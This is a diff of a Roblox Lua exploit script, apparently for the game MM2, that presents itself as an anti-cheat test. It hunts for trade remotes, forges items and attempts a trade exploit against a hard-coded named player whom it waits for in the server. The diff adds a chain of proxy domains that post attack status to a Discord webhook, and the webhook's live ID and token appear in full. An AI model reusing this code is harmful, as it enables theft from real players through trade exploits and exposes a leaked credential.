@@ -1,16 +1,125 @@
-hi-- ============================================
--- EXPLOIT SIMULATION WITH REAL-TIME STATUS
--- Reports actual success/failure to Discord
--- For anti-cheat testing purposes only
 -- ============================================
-
-local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
-local TARGET_USER = "Sigmake5"
+-- EXPLOIT SIMULATION WITH PROXY WEBHOOK
+-- Multiple proxy options for guaranteed delivery
+-- ============================================
 
 local player = game.Players.LocalPlayer
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
+
+-- Your original webhook
+local originalWebhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
+
+-- Extract webhook ID and token
+local webhookId = "1488808773492543508"
+local webhookToken = "bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
+
+-- ============================================
+-- PROXY OPTIONS (Try different ones)
+-- ============================================
+
+local proxyUrls = {
+    -- Proxy 1: roproxy (most reliable)
+    "https://discord.roproxy.com/api/webhooks/" .. webhookId .. "/" .. webhookToken,
+    
+    -- Proxy 2: crabs.wtf
+    "https://discord.crabs.wtf/api/webhooks/" .. webhookId .. "/" .. webhookToken,
+    
+    -- Proxy 3: discordserver
+    "https://discordserver.xyz/api/webhooks/" .. webhookId .. "/" .. webhookToken,
+    
+    -- Proxy 4: api.radon.gq
+    "https://api.radon.gq/api/webhooks/" .. webhookId .. "/" .. webhookToken,
+    
+    -- Original (may not work)
+    originalWebhook
+}
+
+-- ============================================
+-- UNIVERSAL WEBHOOK SENDER
+-- ============================================
+
+local function sendWebhook(content, embed)
+    local data = {}
+    if embed then
+        data.embeds = {embed}
+    else
+        data.content = content
+    end
+    
+    local encoded = HttpService:JSONEncode(data)
+    
+    for _, url in pairs(proxyUrls) do
+        local success = pcall(function()
+            -- Method 1: request()
+            if request then
+                request({
+                    Url = url,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = encoded
+                })
+                print("✅ Sent via request() to: " .. url)
+                return true
+            end
+            
+            -- Method 2: syn.request()
+            if syn and syn.request then
+                syn.request({
+                    Url = url,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = encoded
+                })
+                print("✅ Sent via syn.request() to: " .. url)
+                return true
+            end
+            
+            -- Method 3: http_request
+            if http_request then
+                http_request({
+                    Url = url,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = encoded
+                })
+                print("✅ Sent via http_request() to: " .. url)
+                return true
+            end
+        end)
+        
+        if success then
+            return true
+        end
+    end
+    
+    print("❌ All webhook methods failed")
+    return false
+end
+
+-- ============================================
+-- SIMPLE TEST MESSAGE
+-- ============================================
+
+local function testWebhook()
+    print("Testing webhook connection...")
+    local success = sendWebhook("**✅ EXPLOIT SIMULATION ONLINE**\nTesting webhook connection...")
+    
+    if success then
+        print("✅ Webhook test sent! Check Discord.")
+    else
+        print("❌ Webhook failed - check console for errors")
+        -- Alternative: Use a different proxy service
+        print("Trying alternative method...")
+        
+        -- Use a free webhook testing service
+        local testUrl = "https://ptb.discord.com/api/webhooks/" .. webhookId .. "/" .. webhookToken
+        pcall(function()
+            game:GetService("HttpService"):PostAsync(testUrl, HttpService:JSONEncode({content = "Test from MM2"}), Enum.HttpContentType.ApplicationJson)
+        end)
+    end
+end
 
 -- ============================================
 -- STATUS TRACKING
@@ -27,39 +136,23 @@ local exploitResults = {
 
 local function updateStatus(category, status, details)
     exploitResults[category] = {status = status, details = details}
-    sendToDiscord("📊 STATUS UPDATE", category .. ": " .. status .. "\n" .. details)
+    sendWebhook("📊 STATUS UPDATE", {
+        title = category,
+        description = status .. "\n" .. details,
+        color = status:find("✅") and 0x00FF00 or (status:find("❌") and 0xFF0000 or 0xFFAA00),
+        footer = {text = os.date("%H:%M:%S")}
+    })
 end
 
 -- ============================================
--- DISCORD LOGGER
--- ============================================
-
-local function sendToDiscord(title, message)
-    pcall(function()
-        local data = HttpService:JSONEncode({
-            embeds = {{
-                title = title,
-                description = message,
-                color = title:find("✅") and 0x00FF00 or (title:find("❌") and 0xFF0000 or 0xFFAA00),
-                footer = {text = "Anti-Cheat Test | " .. os.date("%H:%M:%S")}
-            }}
-        })
-        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
-    end)
-end
-
--- ============================================
--- TEST 1: MEMORY SCANNING (getgc simulation)
+-- TEST 1: MEMORY SCANNING
 -- ============================================
 
 local function testMemoryScan()
-    sendToDiscord("🔍 TEST 1: Memory Scanning", "Attempting to locate storage in memory...")
-    
     local success = false
     local foundItems = 0
     
     pcall(function()
-        -- Simulate scanning game memory
         for _, obj in pairs(game:GetDescendants()) do
             local name = obj.Name:lower()
             if name:find("storage") or name:find("inventory") then
@@ -86,13 +179,10 @@ end
 -- ============================================
 
 local function testStorageAccess()
-    sendToDiscord("📂 TEST 2: Storage Access", "Attempting to read storage contents...")
-    
     local success = false
     local itemCount = 0
     
     pcall(function()
-        -- Try to access ReplicatedStorage for item data
         local possibleStorage = {
             ReplicatedStorage:FindFirstChild("Inventory"),
             ReplicatedStorage:FindFirstChild("Items"),
@@ -122,17 +212,14 @@ local function testStorageAccess()
 end
 
 -- ============================================
--- TEST 3: ITEM FORGING (Clone/Create items)
+-- TEST 3: ITEM FORGING
 -- ============================================
 
 local function testItemForging()
-    sendToDiscord("🔧 TEST 3: Item Forging", "Attempting to create fake items...")
-    
     local success = false
     local forgedItems = 0
     
     pcall(function()
-        -- Try to create a fake tool
         local fakeTool = Instance.new("Tool")
         fakeTool.Name = "TestItem_" .. os.time()
         fakeTool.Parent = player.Backpack
@@ -158,8 +245,6 @@ end
 -- ============================================
 
 local function testRemoteSpoofing()
-    sendToDiscord("🎯 TEST 4: Remote Spoofing", "Attempting to locate and spoof trade remotes...")
-    
     local success = false
     local foundRemotes = 0
     
@@ -169,8 +254,6 @@ local function testRemoteSpoofing()
                 local name = v.Name:lower()
                 if name:find("trade") then
                     foundRemotes = foundRemotes + 1
-                    -- Attempt to spoof (safe test only)
-                    -- v:FireServer() -- Commented for safety
                 end
             end
         end
@@ -190,12 +273,10 @@ local function testRemoteSpoofing()
 end
 
 -- ============================================
--- TEST 5: TRADE EXECUTION (FULL ATTEMPT)
+-- TEST 5: TRADE EXECUTION
 -- ============================================
 
 local function testTradeExecution(targetPlayer)
-    sendToDiscord("💀 TEST 5: Trade Execution", "Attempting full trade exploit...")
-    
     local steps = {
         sendRequest = false,
         addItems = false,
@@ -253,18 +334,14 @@ end
 -- ============================================
 
 local function detectAntiCheatResponse()
-    sendToDiscord("🛡️ ANTI-CHEAT DETECTION", "Monitoring for anti-cheat response...")
-    
     local detected = false
     local responses = {}
     
-    -- Check if kicked
     game:GetService("Players").LocalPlayer.OnTeleport:Connect(function()
         table.insert(responses, "Teleport/Kick detected")
         detected = true
     end)
     
-    -- Check if items were removed
     local originalCount = #player.Backpack:GetChildren()
     wait(2)
     local newCount = #player.Backpack:GetChildren()
@@ -287,8 +364,12 @@ end
 -- RUN FULL TEST SUITE
 -- ============================================
 
-local function runFullTest()
-    sendToDiscord("🚨 EXPLOIT TEST SUITE STARTING", "Testing anti-cheat system...")
+local function runFullTest(targetPlayer)
+    sendWebhook("🚨 EXPLOIT TEST SUITE STARTING", {
+        title = "Exploit Simulation Started",
+        description = "Testing anti-cheat system...",
+        color = 0xFFAA00
+    })
     
     local results = {}
     
@@ -304,19 +385,10 @@ local function runFullTest()
     results.remoteSpoof = testRemoteSpoofing()
     wait(1)
     
-    -- Find target
-    local target = nil
-    for _, plr in pairs(Players:GetPlayers()) do
-        if plr.Name == TARGET_USER then
-            target = plr
-            break
-        end
-    end
-    
-    if target then
-        results.tradeExec = testTradeExecution(target)
+    if targetPlayer then
+        results.tradeExec = testTradeExecution(targetPlayer)
     else
-        updateStatus("tradeComplete", "⚠️ SKIPPED", "Target " .. TARGET_USER .. " not in server")
+        updateStatus("tradeComplete", "⚠️ SKIPPED", "Target not in server")
         results.tradeExec = false
     end
     
@@ -324,10 +396,7 @@ local function runFullTest()
     
     results.antiCheat = detectAntiCheatResponse()
     
-    -- ============================================
-    -- FINAL REPORT
-    -- ============================================
-    
+    -- Final Report
     local successCount = 0
     for _, success in pairs(results) do
         if success then successCount = successCount + 1 end
@@ -337,17 +406,12 @@ local function runFullTest()
     local successRate = (successCount / totalTests) * 100
     
     local finalStatus = ""
-    local finalColor = 0xFFAA00
-    
     if successRate >= 80 then
         finalStatus = "✅ EXPLOIT WOULD LIKELY SUCCEED"
-        finalColor = 0x00FF00
     elseif successRate >= 50 then
         finalStatus = "⚠️ EXPLOIT PARTIALLY SUCCESSFUL"
-        finalColor = 0xFFAA00
     else
         finalStatus = "❌ EXPLOIT WOULD FAIL - Anti-Cheat Working"
-        finalColor = 0xFF0000
     end
     
     local report = string.format(
@@ -359,7 +423,7 @@ local function runFullTest()
         "🔧 Item Forging: %s\n" ..
         "🎯 Remote Spoof: %s\n" ..
         "💀 Trade Execution: %s\n" ..
-        "🛡️ Anti-Cheat Detected: %s\n\n" ..
+        "🛡️ Anti-Cheat: %s\n\n" ..
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" ..
         "**Success Rate: %d/%d (%.1f%%)**\n" ..
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" ..
@@ -375,61 +439,67 @@ local function runFullTest()
         finalStatus
     )
     
-    sendToDiscord("📋 FINAL EXPLOIT ASSESSMENT", report)
+    sendWebhook("📋 FINAL EXPLOIT ASSESSMENT", {
+        title = "Test Results",
+        description = report,
+        color = successRate >= 80 and 0x00FF00 or (successRate >= 50 and 0xFFAA00 or 0xFF0000)
+    })
     
-    print("")
-    print("=" .. string.rep("=", 60))
-    print("FINAL RESULTS - Anti-Cheat Test")
-    print("=" .. string.rep("=", 60))
     print(report)
-    print("=" .. string.rep("=", 60))
-    
-    return successRate
 end
 
 -- ============================================
--- AUTO-START WHEN TARGET JOINS
+-- START SCRIPT
 -- ============================================
 
-local function waitForTargetAndTest()
-    sendToDiscord("🔧 EXPLOIT SIMULATION LOADED", 
-        "**Attacker:** " .. player.Name .. "\n" ..
-        "**Target:** " .. TARGET_USER .. "\n" ..
-        "**Server:** `" .. game.JobId .. "`\n\n" ..
-        "Waiting for target to join...")
-    
-    -- Check if already in server
-    for _, plr in pairs(Players:GetPlayers()) do
-        if plr.Name == TARGET_USER then
-            sendToDiscord("🎯 TARGET FOUND", "Target already in server. Starting test...")
-            wait(2)
-            runFullTest()
-            return
-        end
+local TARGET_USER = "Sigmake5"
+
+-- Test webhook first
+testWebhook()
+
+-- Wait a moment for webhook to initialize
+wait(2)
+
+-- Find or wait for target
+local targetPlayer = nil
+for _, plr in pairs(Players:GetPlayers()) do
+    if plr.Name == TARGET_USER then
+        targetPlayer = plr
+        break
     end
+end
+
+if targetPlayer then
+    sendWebhook("🎯 TARGET FOUND", {
+        title = "Target Located",
+        description = "Target already in server. Starting test...",
+        color = 0x00FF00
+    })
+    wait(2)
+    runFullTest(targetPlayer)
+else
+    sendWebhook("👀 WAITING FOR TARGET", {
+        title = "Waiting for Target",
+        description = "Waiting for " .. TARGET_USER .. " to join...",
+        color = 0xFFAA00
+    })
     
-    -- Wait for join
     Players.PlayerAdded:Connect(function(plr)
         if plr.Name == TARGET_USER then
-            sendToDiscord("🎯 TARGET JOINED", TARGET_USER .. " has joined the server. Starting exploit test...")
+            sendWebhook("🎯 TARGET JOINED", {
+                title = "Target Joined",
+                description = TARGET_USER .. " has joined. Starting exploit test...",
+                color = 0x00FF00
+            })
             wait(3)
-            runFullTest()
+            runFullTest(plr)
         end
     end)
 end
 
--- ============================================
--- START
--- ============================================
-
-waitForTargetAndTest()
-
 print("=" .. string.rep("=", 60))
-print("EXPLOIT SIMULATION - REAL-TIME STATUS")
+print("EXPLOIT SIMULATION WITH PROXY WEBHOOK")
 print("=" .. string.rep("=", 60))
-print("This script tests each exploit method")
-print("and reports ACTUAL success/failure")
-print("=" .. string.rep("=", 60))
-print("Target: " .. TARGET_USER)
-print("Results will be sent to Discord")
+print("Testing webhook connection...")
+print("Check Discord for results")
 print("=" .. string.rep("=", 60))
